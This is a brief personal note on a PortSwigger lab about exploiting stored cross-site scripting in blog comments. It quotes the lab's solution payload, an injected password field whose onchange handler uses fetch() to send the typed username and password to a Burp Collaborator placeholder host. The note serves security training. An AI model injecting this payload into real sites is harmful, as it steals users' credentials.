# [Lab: Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)

## Lab

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

## Analysis

I read the solutions. it's look like this:

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

It will create a form in the comment section, who the hell in the world will enter their credentials in this?
